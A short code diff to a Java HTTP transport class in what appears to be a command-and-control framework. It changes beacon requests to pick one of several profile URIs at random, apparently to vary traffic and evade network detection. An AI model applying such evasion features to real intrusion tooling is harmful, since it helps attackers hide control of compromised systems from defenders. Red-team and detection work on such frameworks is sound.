@@ -351,7 +351,7 @@ public class HttpTransport extends Transport {
     }
 
     private URL buildProfileUrl(C2VerbConfig profile) throws MalformedURLException {
-        if (profile == null || profile.uri == null) {
+        if (profile == null || profile.uris == null || profile.uris.length == 0) {
             return this.targetUrl;
         }
 
@@ -359,7 +359,8 @@ public class HttpTransport extends Transport {
             + this.targetUrl.getHost() + ":"
             + this.targetUrl.getPort();
 
-        String uri = profile.uri;
+        // Pick one of the profile's candidate URIs at random per request.
+        String uri = profile.uris[(int)(Math.random() * profile.uris.length)];
         if (!uri.startsWith("/")) {
             uri = "/" + uri;
         }
